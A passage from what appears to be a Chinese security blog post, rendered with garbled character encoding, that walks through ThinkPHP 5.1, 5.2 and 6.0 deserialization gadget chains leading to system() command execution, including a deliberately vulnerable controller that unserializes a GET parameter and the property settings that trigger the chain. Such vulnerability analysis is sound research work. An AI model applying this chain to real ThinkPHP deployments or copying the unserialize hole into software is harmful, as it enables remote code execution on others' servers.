class="comment">// è·å–åŸå§‹æ•°æ®</span></span><br><span class="line">        <span class="keyword">return</span> $data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $name = (string) $name;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">''</span> != $name) &#123;</span><br><span class="line">        <span class="comment">// è§£æname</span></span><br><span class="line">        <span class="keyword">if</span> (strpos($name, <span class="string">'/'</span>)) &#123;</span><br><span class="line">            <span class="keyword">list</span>($name, $type) = explode(<span class="string">'/'</span>, $name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;getData($data, $name);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_null($data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $default;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_object($data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $data;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è§£æè¿‡æ»¤å™¨</span></span><br><span class="line">    $filter = <span class="keyword">$this</span>-&gt;getFilter($filter, $default);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_array($data)) &#123;</span><br><span class="line">        array_walk_recursive($data, [<span class="keyword">$this</span>, <span class="string">'filterValue'</span>], $filter);</span><br><span class="line">        <span class="keyword">if</span> (version_compare(PHP_VERSION, <span class="string">'7.1.0'</span>, <span class="string">'&lt;'</span>)) &#123;</span><br><span class="line">            <span class="comment">// æ¢å¤PHPç‰ˆæœ¬ä½äº 7.1 æ—¶ array_walk_recursive ä¸­æ¶ˆè€—çš„å†…éƒ¨æŒ‡é’ˆ</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;arrayReset($data);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filterValue($data, $name, $filter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($type) &amp;&amp; $data !== $default) &#123;</span><br><span class="line">        <span class="comment">// å¼ºåˆ¶ç±»å‹è½¬æ¢</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;typeCast($data, $type);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getDataé¡ºç€çœ‹ä¸€ä¸‹å¯æ§ã€‚ä¸”<code>$data</code>=<code>$data[$name]</code>,<code>$filter</code>æ¥è‡ª<code>$this-&gt;filter</code>.æœ€ååˆ°äº†array_walk_resursiveç›¸å½“äºç›´æ¥å¯¹æ•°ç»„æ¯ä¸€ä¸ªå€¼è°ƒç”¨äº†å›è°ƒå‡½æ•°<code>$this-&gt;filterValue($filter)</code>ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (is_array($data)) &#123;</span><br><span class="line">    array_walk_recursive($data, [<span class="keyword">$this</span>, <span class="string">'filterValue'</span>], $filter);</span><br></pre></td></tr></table></figure><p><code>$this-&gt;filterValue</code>æ˜¯é€šè¿‡call_user_funcæ‰§è¡Œçš„è‡ªç„¶ä¸å¿…è¯´äº†ã€‚<br>æ—¢ç„¶å¦‚æ­¤ã€‚æ§åˆ¶<code>$this-&gt;filter</code>ä¸ºsystem,<code>$data</code>æ•°ç»„ç¬¬ä¸€ä¸ªå€¼ä¸ºå‘½ä»¤<code>whoami</code>ä¹‹ç±»çš„å°±å¯ä»¥æ‰§è¡Œå‘½ä»¤äº†ã€‚</p><p>è‡³æ­¤popé“¾å°±å®Œæ•´äº†ã€‚å…¶å®ä¸­é—´æœ‰ä¸ªæ­¥éª¤å°±æ˜¯è§£å†³<code>call_user_func_array</code>é‚£æ‰¾åˆ°ä¸å—å®šæ­»å‚æ•°å½±å“çš„å‘½ä»¤æ‰§è¡Œè¿™å—,ä¸»è¦æ€è·¯å°±æ˜¯åˆ©ç”¨thinkphpè¿‡æ»¤å™¨,è¦†ç›–filterçš„æ–¹æ³•å»æ‰§è¡Œä»£ç ã€‚<br>è€Œåœ¨æ‰¾åˆ°inputä½œä¸ºä¸»è¦ä¸‹æ‰‹ç‚¹æ—¶,<code>call_user_func_array(array(ä»»æ„ç±»,ä»»æ„æ–¹æ³•),$args)</code> ä¸­ <code>$args</code> æ•°ç»„çš„ç¬¬ä¸€ä¸ªå˜é‡ï¼Œå³æˆ‘ä»¬å‰é¢è¯´çš„ä¸€ä¸ªå›ºå®šæ­»çš„ç±»å¯¹è±¡ä¼šä½œä¸º $data ä¼ ç»™ input æ–¹æ³•ï¼Œé‚£ä¹ˆåœ¨å¼ºè½¬æˆå­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œæ¡†æ¶å°±ä¼šæŠ¥é”™é€€å‡ºã€‚æ‰€ä»¥æˆ‘ä»¬æ‰¾ä¸åˆ°å°±ç»§ç»­æ‰¾ä¸Šå±‚è°ƒç”¨inputçš„å‡½æ•°ã€‚ç›´åˆ°æ‰¾åˆ°å¯æ§å‚æ•°çš„å‡½æ•°<code>isAjax</code>.å°±èƒ½è§£å†³å‚æ•°ä¸å¯æ§çš„é—®é¢˜ã€‚</p><h2 id="tp5-2-x-unserialize"><a href="#tp5-2-x-unserialize" class="headerlink" title="tp5.2.x-unserialize"></a>tp5.2.x-unserialize</h2><p>5.2ç‰ˆæœ¬çš„é“¾å­è²Œä¼¼è·Ÿä¹‹å‰æ²¡å•¥åŒºåˆ«ã€‚ä½†æ˜¯æˆ‘composerä¸€ç›´å®‰è£…ä¸ä¸Šã€‚åŠ ä¸Š5.2ç‰ˆæœ¬ä½œä¸ºdevç‰ˆæœ¬æœ¬èº«å‡ºç°çš„ä¸å¤š,æ‰€ä»¥è¿™é‡Œç”¨thinkphp-vulné‡Œçš„ä¾‹å­ç®€å•æä¸€ä¸‹ã€‚</p><p>å‰é¢å…¥æ‰‹ç‚¹å¤§åŒå°å¼‚ã€‚å”¯ä¸€æœ‰åŒºåˆ«çš„åœ°æ–¹åœ¨è§¦å‘<code>__call</code>çš„ä»£ç <code>$relation-&gt;visible($name)</code>è¿™ã€‚çœ‹ä¼¼tp5.2å·²ç»æŠŠè¿™å¥ä»£ç åˆ äº†ã€‚ä½†æ˜¯å®é™…ä¸Šæ˜¯è¢«è½¬ç§»åˆ°äº†<code>appendAttrToArray</code>è¿™ä¸ªæ–¹æ³•ä¸­ã€‚å› æ­¤åŸºæœ¬æ²¡æœ‰åŒºåˆ«ã€‚æˆ‘å°±ä¸è·Ÿäº†ã€‚</p><p>æ”¾ä¸Šå‡ å¼ å›¾<br><img src="/2020/08/05/Thinkphp-vuln/23.PNG" class="lazyload" data-srcset="23.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>çœŸæ­£çš„æ‰§è¡Œç‚¹åœ¨ä¸‹é¢çš„<code>$closure($value,$this-&gt;data)</code>è¿™é‡Œçš„åŠ¨æ€è°ƒç”¨ã€‚å‚æ•°å‡å¯æ§ã€‚æ‰€ä»¥èµ‹å€¼å‘½ä»¤æ‰§è¡Œçš„å‚æ•°å³å¯ã€‚<br><img src="/2020/08/05/Thinkphp-vuln/24.PNG" class="lazyload" data-srcset="24.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="tp6-0-x-unserialize"><a href="#tp6-0-x-unserialize" class="headerlink" title="tp6.0.x-unserialize"></a>tp6.0.x-unserialize</h2><p>ä»Šå¤©é‡æ–°çœ‹äº†ä¸‹ä¹‹å‰åœ¨ phpæ¡†æ¶ååºåˆ—åŒ–ç»ƒä¹  æ–‡ç« é‡Œçš„å†…å®¹ã€‚æ‰æƒ³èµ·æ¥5.2è·Ÿ6.0çš„é“¾å­åº”è¯¥æ˜¯è·Ÿè¿‡äº†ã€‚ä¸è¿‡å½“æ—¶æ²¡æœ‰åŠ¨æ€è°ƒè¯•,ç†è§£ä¹Ÿæ²¡é‚£ä¹ˆæ·±åˆ»ã€‚æ‰€ä»¥è¿˜æ˜¯å†çœ‹ä¸€ä¸‹ã€‚</p><p>è¿˜æ˜¯è€æ ·å­æ›´æ”¹Index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $u = unserialize($_GET[<span class="string">'c'</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'ThinkPHP V6.x'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥ç”¨wh1t3p1g å¸ˆå‚…é›†æˆå¥½çš„ã€‚é¡ºå¸¦ä¹Ÿæ¨èä¸‹å¸ˆå‚…åœ¨å®‰å…¨å®¢ä¸Šé’ˆå¯¹thinkphpé“¾å­çš„åˆ†ææ–‡ç« ã€‚<br><img src="/2020/08/05/Thinkphp-vuln/25.PNG" class="lazyload" data-srcset="25.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>é¦–å…ˆ6.0ç‰ˆæœ¬çš„ä¸»è¦é—®é¢˜æ˜¯å‰é¢5.*ç‰ˆæœ¬çš„åˆ©ç”¨èµ·ç‚¹Windowsç±»éƒ½æ²¡äº†ã€‚ä¹Ÿå°±æ˜¯å°‘äº†ä¸€ä¸ª<code>__destruct()</code>ã€‚é‚£ä¹ˆæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªæ›¿ä»£çš„<code>__destruct</code>ä½œä¸ºèµ·ç‚¹ã€‚å¹¶ä¸”æœ€å¥½å®ƒèƒ½å¤Ÿåœ¨ä¸­é—´æŸä¸ªç¯èŠ‚èµ·åˆ°ä¸å…¶ä»–é“¾å­ç›¸åŒä½œç”¨æ¯”å¦‚è§¦å‘<code>__call</code>,<code>__toString</code>ä¹‹ç±»çš„ã€‚è¿™æ ·çš„é€»è¾‘ä¹Ÿæ˜¯ç¬¬5ç©ºé—´laravelé‚£é¢˜çš„è§£é¢˜æ€è·¯å§ã€‚å› ä¸ºè·Ÿè¿‡é“¾å­çš„äººéƒ½çŸ¥é“åªéœ€è¦ä¸¤ä¸ªç±»å°±èƒ½rce.æ—¢ç„¶å…¶ä¸­ä¸€ä¸ªdestructè¢«å¤„ç†äº†ã€‚æ‰¾ä¸€ä¸ªæ›¿ä»£çš„è‡ªç„¶æ˜¯æœ€ç®€å•çš„åŠæ³•ã€‚</p><p>vendor/topthink/think-orm/src/Model.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;lazySave) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ„é€ lazySaveä¸ºçœŸå€¼ã€‚è¿›å…¥saveå‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">(array $data = [], string $sequence = null)</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// æ•°æ®å¯¹è±¡èµ‹å€¼</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;setAttrs($data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isEmpty() || <span class="keyword">false</span> === <span class="keyword">$this</span>-&gt;trigger(<span class="string">'BeforeWrite'</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $result = <span class="keyword">$this</span>-&gt;exists ? <span class="keyword">$this</span>-&gt;updateData() : <span class="keyword">$this</span>-&gt;insertData($sequence);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">false</span> === $result) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å†™å…¥å›è°ƒ</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;trigger(<span class="string">'AfterWrite'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é‡æ–°è®°å½•åŸå§‹æ•°æ®</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;origin   = <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;set      = [];</span><br><span class="line">    <span class="keyword">$this</span>-&gt;lazySave = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå…³é”®å‡½æ•°æ˜¯<code>updateData</code>.ä¸è¿‡æ—¢ç„¶å¦‚æ­¤æˆ‘ä»¬ä¸èƒ½è¿›å…¥ä¸Šé¢é‚£ä¸ªifåˆ†æ”¯ã€‚<br>isEmptyä¸trigger</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isEmpty</span><span class="params">()</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">trigger</span><span class="params">(string $event)</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;withEvent) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br></pre></td></tr></table></figure><p>æ˜¾ç„¶ã€‚éœ€è¦<br>1.<code>$this-&gt;data</code>ä¸ºéç©ºæ•°ç»„ã€‚<br>2.<code>$this-&gt;withEvent</code>ä¸ºfalse<br>3.<code>$this-&gt;exists</code>ä¸ºtrueè¿›å…¥updateDataå‡½æ•°</p><p>è·Ÿè¿›åˆ°updateDataåã€‚æˆ‘ä»¬ä¸å¦¨å…ˆçœ‹ä¸‹å“ªä¸€ä¸ªå‡½æ•°å¯ä»¥åˆ©ç”¨,å†å›å¤´è€ƒè™‘å‚æ•°çš„æ„é€ ã€‚è¿™é‡Œé¡ºç€çœ‹åˆ°checkAllowFieldså</p><p><img src="/2020/08/05/Thinkphp-vuln/26.PNG" class="lazyload" data-srcset="26.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$table = <span class="keyword">$this</span>-&gt;table ? <span class="keyword">$this</span>-&gt;table . <span class="keyword">$this</span>-&gt;suffix : $query-&gt;getTable();</span><br></pre></td></tr></table></figure><p>å­˜åœ¨å¯æ§å˜é‡çš„æ‹¼æ¥ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è§¦å‘<code>__toString</code>äº†ã€‚åœ¨ç»å†äº†å‰é¢å‡ ä¸ªç‰ˆæœ¬çš„ååºåˆ—åŒ–æ„é€ åï¼Œæˆ‘ä»¬å½“ç„¶æ¸…æ¥štp5.1~5.2ç‰ˆæœ¬çš„é“¾å­åˆ†åˆ«æ˜¯<code>__destruct()=&gt; __toString() =&gt; __call() =&gt; call_user_func_array / $closure($value,$this-&gt;data)</code>çš„ä¸€ç³»åˆ—è°ƒç”¨ã€‚é‚£ä¹ˆæ­¤å¤„æˆ‘ä»¬è‡ªç„¶å¯ä»¥ç»§ç»­è¾¾æˆ__toStringæ¥å»¶ç»­é“¾å­ã€‚</p><p>å›å¤´å†æ£€æŸ¥updateDataè¿™çš„å‚æ•°éœ€è¦ã€‚é¦–å…ˆç¬¬ä¸€ä¸ªtriggeræˆ‘ä»¬å·²ç»æ»¡è¶³æ¡ä»¶äº†ã€‚ç„¶å<code>if (empty($data))</code>è¿™ä¸ªåˆ†æ”¯ä¸èƒ½è¿›å…¥ã€‚é‚£å°±è¦çœ‹å‘getChangedData</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getChangedData</span><span class="params">()</span>: <span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $data = <span class="keyword">$this</span>-&gt;force ? <span class="keyword">$this</span>-&gt;data : array_udiff_assoc(<span class="keyword">$this</span>-&gt;data, <span class="keyword">$this</span>-&gt;origin, <span class="function"><span class="keyword">function</span> <span class="params">($a, $b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">empty</span>($a) || <span class="keyword">empty</span>($b)) &amp;&amp; $a !== $b) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> is_object($a) || $a != $b ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åªè¯»å­—æ®µä¸å…è®¸æ›´æ–°</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;readonly <span class="keyword">as</span> $key =&gt; $field) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($data[$field])) &#123;</span><br><span class="line">            <span class="keyword">unset</span>($data[$field]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»¤<code>$this-&gt;force</code>ä¸ºtrue.ç„¶ådataå°±å¯æ§äº†ã€‚</p><p>æ¥ä¸‹æ¥æ˜¯å›åˆ°åˆ©ç”¨å‡½æ•°checkAllowFields.æ‹¼æ¥å¤„ä¹‹å‰çš„ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;field)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;schema)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;field = array_keys(array_merge(<span class="keyword">$this</span>-&gt;schema, <span class="keyword">$this</span>-&gt;jsonType));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $query = <span class="keyword">$this</span>-&gt;db();</span><br></pre></td></tr></table></figure><p>éœ€è¦<br>1.<code>$this-&gt;field</code>ä¸ºç©ºè¿›å…¥åˆ†æ”¯<br>2.<code>$this-&gt;schema</code>ä¸ºç©ºè¿›å…¥else</p><p>çœ‹ä¸€çœ¼db()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">db</span><span class="params">($scope = [])</span>: <span class="title">Query</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/** <span class="doctag">@var</span> Query $query */</span></span><br><span class="line">    $query = <span class="keyword">self</span>::$db-&gt;connect(<span class="keyword">$this</span>-&gt;connection)</span><br><span class="line">        -&gt;name(<span class="keyword">$this</span>-&gt;name . <span class="keyword">$this</span>-&gt;suffix)</span><br><span class="line">        -&gt;pk(<span class="keyword">$this</span>-&gt;pk);</span><br></pre></td></tr></table></figure><p>åŸæ¥db()å‡½æ•°è¿™é‡Œä¹Ÿæœ‰ä¸€ä¸ªå˜é‡æ‹¼æ¥â€¦â€¦ä¸è¿‡æ®Šé€”åŒå½’ã€‚æˆ‘ä»¬ç”¨å“ªä¸€ä¸ªéƒ½å·®ä¸å¤šã€‚ä¾‹å¦‚expä¸­é“¾å­æ˜¯æŠŠ<code>$this-&gt;suffix</code>ä½œä¸ºè§¦å‘çš„å¯¹è±¡çš„ã€‚</p><p>ç„¶ååé¢å°±æ˜¯ä¸€è·¯ç•…é€šäº†ã€‚è¿™é‡Œè·Ÿ5.1(æ³¨æ„ä¸æ˜¯5.0,5.0 çš„ toStringç”¨çš„æ˜¯modelç±»çš„)ä¸€æ ·ç”¨çš„æ˜¯Conversionç±»é‡Œçš„<code>__toString() =&gt; toJson =&gt; toArray =&gt; getAttr =&gt; getValue()</code></p><p>æˆ‘ä»¬ä¸»è¦åœ¨getAttr,getValueé‡Œæ„é€ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span><span class="params">(string $name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $relation = <span class="keyword">false</span>;</span><br><span class="line">        $value    = <span class="keyword">$this</span>-&gt;getData($name);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvalidArgumentException $e) &#123;</span><br><span class="line">        $relation = <span class="keyword">$this</span>-&gt;isRelationAttr($name);</span><br><span class="line">        $value    = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getValue($name, $value, $relation);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function getData(string $name = null)//$name='wh1t3p1g'</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null($name)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line">    $fieldName = <span class="keyword">$this</span>-&gt;getRealFieldName($name);</span><br><span class="line">    <span class="keyword">if</span> (array_key_exists($fieldName, <span class="keyword">$this</span>-&gt;data)) &#123;<span class="comment">//$this-&gt;data = array("wh1t3p1g"=&gt;"whoami");</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$fieldName];<span class="comment">//è¿”å›'whoami'ï¼Œå›åˆ°getAttr</span></span><br><span class="line">    &#125; <span class="keyword">elseif</span> (array_key_exists($fieldName, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[$fieldName];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getValue</span><span class="params">(string $name, $value, bool $relation = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;                 <span class="comment">//$name='wh1t3p1g' $value=â€˜lsâ€™ $relation=false</span></span><br><span class="line">    <span class="comment">// æ£€æµ‹å±æ€§è·å–å™¨</span></span><br><span class="line">    $fieldName = <span class="keyword">$this</span>-&gt;getRealFieldName($name);  <span class="comment">//è¯¥å‡½æ•°é»˜è®¤è¿”å›$name='wh1t3p1g'=$fieldName </span></span><br><span class="line">    $method    = <span class="string">'get'</span> . App::parseName($name, <span class="number">1</span>) . <span class="string">'Attr'</span>;  <span class="comment">//æ‹¼æ¥å­—ç¬¦ï¼šgetlinAttr</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;withAttr[$fieldName])) &#123; <span class="comment">//['wh1t3p1g'=&gt;'system']</span></span><br><span class="line">        <span class="keyword">if</span> ($relation) &#123; <span class="comment">//$relation=false</span></span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;getRelationValue($name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $closure = <span class="keyword">$this</span>-&gt;withAttr[$fieldName]; <span class="comment">//$closure='system'</span></span><br><span class="line">        $value   = $closure($value, <span class="keyword">$this</span>-&gt;data);<span class="comment">//system('whoami',$this-&gt;data</span></span><br><span class="line">    &#125;</span><br><span class="line">    .......</span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è‡³æ­¤å®Œæˆæ•´æ¡åˆ©ç”¨é“¾ã€‚æ³¨æ„å®ƒçš„è°ƒç”¨æ–¹æ³•æ˜¯<code>system(&quot;whoami&quot;, 